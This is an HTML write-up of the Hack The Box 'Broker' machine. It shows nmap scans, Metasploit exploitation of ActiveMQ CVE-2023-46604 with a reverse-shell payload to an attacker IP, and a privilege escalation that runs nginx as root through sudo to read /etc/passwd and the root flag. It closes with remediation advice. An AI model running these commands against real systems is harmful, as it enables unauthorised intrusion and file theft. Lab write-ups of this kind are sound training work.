@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Broker - Hack The Box Report</title>
+  <link rel="stylesheet" href="../style.css" />
+</head>
+<body>
+  <header>
+    <h1>Broker</h1>
+    <p>Hack The Box machine report covering enumeration, Apache ActiveMQ exploitation, and privilege escalation through sudo nginx.</p>
+  </header>
+
+  <main>
+    <section>
+      <h2>Machine Information</h2>
+      <table>
+        <tr><th>Machine</th><td>Broker</td></tr>
+        <tr><th>Platform</th><td>Hack The Box</td></tr>
+        <tr><th>Operating System</th><td>Linux</td></tr>
+        <tr><th>Difficulty</th><td>Easy</td></tr>
+        <tr><th>Target IP</th><td>10.129.230.87</td></tr>
+        <tr><th>Initial Access</th><td>Apache ActiveMQ CVE-2023-46604</td></tr>
+        <tr><th>Privilege Escalation</th><td>sudo nginx file-read abuse</td></tr>
+      </table>
+    </section>
+
+    <section>
+      <h2>Summary</h2>
+      <p>
+        Broker exposed several messaging-related services, including Apache ActiveMQ on port 61616.
+        Nmap identified the OpenWire transport as ActiveMQ 5.15.15, which is vulnerable to
+        CVE-2023-46604. I used Metasploit to exploit the vulnerable ActiveMQ service and obtained
+        a shell as the <code>activemq</code> user.
+      </p>
+      <p>
+        After gaining access, <code>sudo -l</code> showed that the <code>activemq</code> user could run
+        <code>/usr/sbin/nginx</code> as root without a password. Using a custom nginx configuration,
+        I started nginx as root and served the filesystem over localhost. This allowed me to read
+        privileged files, including the root flag.
+      </p>
+    </section>
+
+    <section>
+      <h2>Reconnaissance</h2>
+      <p>I started with a full TCP port scan to identify all open services.</p>
+
+      <pre><code>nmap -p- -oN Files/nmap_all_simple 10.129.230.87</code></pre>
+
+      <p>The scan found the following open ports:</p>
+
+      <pre><code>PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+1883/tcp  open  mqtt
+5672/tcp  open  amqp
+8161/tcp  open  patrol-snmp
+41937/tcp open  unknown
+61613/tcp open  unknown
+61614/tcp open  unknown
+61616/tcp open  unknown</code></pre>
+
+      <p>I then ran a focused service/version scan against the discovered ports.</p>
+
+      <pre><code>nmap -sVC -p 22,80,1883,5672,8161,41937,61613,61614,61616 -oN Files/nmap_focused_full 10.129.230.87</code></pre>
+
+      <p>Important findings from the focused scan:</p>
+
+      <pre><code>22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu
+80/tcp    open  http       nginx 1.18.0 (Ubuntu)
+8161/tcp  open  http       Jetty 9.4.39.v20210325
+61613/tcp open  stomp      Apache ActiveMQ
+61614/tcp open  http       Jetty 9.4.39.v20210325
+61616/tcp open  apachemq   ActiveMQ OpenWire transport 5.15.15</code></pre>
+
+      <p>
+        The most important result was port <code>61616</code>, which exposed Apache ActiveMQ
+        OpenWire transport version <code>5.15.15</code>.
+      </p>
+    </section>
+
+    <section>
+      <h2>Initial Access</h2>
+      <p>
+        Apache ActiveMQ 5.15.15 is vulnerable to CVE-2023-46604, a remote code execution
+        vulnerability affecting the OpenWire protocol. Since the target exposed ActiveMQ on
+        port <code>61616</code>, I used the Metasploit module for this vulnerability.
+      </p>
+
+      <pre><code>msfconsole
+use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
+set RHOSTS 10.129.230.87
+set RPORT 61616
+set target 1
+set payload cmd/linux/http/x64/meterpreter/reverse_tcp
+set LHOST 10.10.14.209
+set LPORT 4444
+run</code></pre>
+
+      <p>
+        During exploitation, I had to adjust the Metasploit HTTP server ports because some local
+        ports were already in use. After using available ports, the exploit succeeded and returned
+        a shell as the <code>activemq</code> user.
+      </p>
+
+      <pre><code>whoami
+activemq</code></pre>
+    </section>
+
+    <section>
+      <h2>User Flag</h2>
+      <p>
+        The user flag was located in the <code>activemq</code> home directory.
+      </p>
+
+      <pre><code>cd /home/activemq
+cat user.txt</code></pre>
+
+      <pre><code>user flag: [REDACTED]</code></pre>
+    </section>
+
+    <section>
+      <h2>Privilege Escalation Enumeration</h2>
+      <p>
+        After obtaining a shell, I checked sudo permissions for the <code>activemq</code> user.
+      </p>
+
+      <pre><code>sudo -l</code></pre>
+
+      <p>The output showed:</p>
+
+      <pre><code>Matching Defaults entries for activemq on broker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,
+    use_pty
+
+User activemq may run the following commands on broker:
+    (ALL : ALL) NOPASSWD: /usr/sbin/nginx</code></pre>
+
+      <p>
+        This meant the <code>activemq</code> user could run nginx as root without needing a password.
+        Since nginx can be started with a custom configuration file, I could make nginx serve files
+        from the root filesystem.
+      </p>
+    </section>
+
+    <section>
+      <h2>Privilege Escalation with nginx</h2>
+      <p>
+        I created a custom nginx configuration in <code>/tmp</code>. The important part is
+        <code>root /;</code>, which tells nginx to serve files starting from the top of the filesystem.
+        Because nginx is started with sudo, it runs as root and can read files that the
+        <code>activemq</code> user normally cannot access.
+      </p>
+
+      <pre><code>cat &gt; /tmp/nginx-root.conf &lt;&lt;'EOF'
+user root;
+worker_processes 1;
+pid /tmp/nginx-root.pid;
+
+events {
+    worker_connections 1024;
+}
+
+http {
+    server {
+        listen 127.0.0.1:1337;
+        root /;
+        autoindex on;
+    }
+}
+EOF</code></pre>
+
+      <p>I then started nginx using the custom configuration:</p>
+
+      <pre><code>sudo /usr/sbin/nginx -c /tmp/nginx-root.conf</code></pre>
+
+      <p>To verify that the technique worked, I requested <code>/etc/passwd</code> through localhost:</p>
+
+      <pre><code>curl http://127.0.0.1:1337/etc/passwd</code></pre>
+
+      <p>The file was successfully returned, confirming that nginx was serving the filesystem.</p>
+
+      <p>I then read the root flag:</p>
+
+      <pre><code>curl http://127.0.0.1:1337/root/root.txt</code></pre>
+
+      <pre><code>root flag: [REDACTED]</code></pre>
+
+    </section>
+
+    <section>
+      <h2>Cleanup</h2>
+      <p>After collecting the flag, I stopped the temporary nginx instance and removed the custom config file.</p>
+
+      <pre><code>sudo /usr/sbin/nginx -s stop -c /tmp/nginx-root.conf
+rm /tmp/nginx-root.conf</code></pre>
+    </section>
+
+    <section>
+      <h2>Attack Path</h2>
+      <pre><code>1. Enumerated open ports with Nmap.
+2. Identified Apache ActiveMQ 5.15.15 on port 61616.
+3. Exploited CVE-2023-46604 using Metasploit.
+4. Gained shell as activemq.
+5. Found sudo permission allowing activemq to run /usr/sbin/nginx as root.
+6. Created a custom nginx config serving the root filesystem.
+7. Used localhost curl requests to read /home/activemq/user.txt and /root/root.txt.</code></pre>
+    </section>
+
+    <section>
+      <h2>Lessons Learned</h2>
+      <ul>
+        <li>Version detection is critical because the ActiveMQ version directly pointed to a known RCE vulnerability.</li>
+        <li>Messaging services such as ActiveMQ, STOMP, MQTT, and AMQP should not be unnecessarily exposed.</li>
+        <li><code>sudo -l</code> is one of the first commands to run after getting a shell because misconfigured sudo permissions can lead to privilege escalation.</li>
+        <li>GTFOBins is useful for understanding how allowed binaries can be abused in unintended ways.</li>
+        <li>Allowing a low-privileged user to run nginx as root is dangerous because a custom config can expose sensitive files.</li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>Remediation</h2>
+      <ul>
+        <li>Upgrade Apache ActiveMQ to a patched version that is not vulnerable to CVE-2023-46604.</li>
+        <li>Restrict access to ActiveMQ management and transport ports using firewall rules or VPN-only access.</li>
+        <li>Remove unnecessary sudo permissions for service accounts.</li>
+        <li>Do not allow service users to run nginx as root with arbitrary configuration files.</li>
+        <li>Monitor for suspicious nginx processes running with non-standard configuration files or listening on unusual localhost ports.</li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>Conclusion</h2>
+      <p>
+        Broker demonstrated how an exposed vulnerable service can lead to initial access and how a simple
+        sudo misconfiguration can allow privilege escalation. The ActiveMQ service provided the foothold,
+        while the ability to run nginx as root allowed privileged file reads and access to the root flag.
+      </p>
+    </section>
+  </main>
+</body>
+</html>
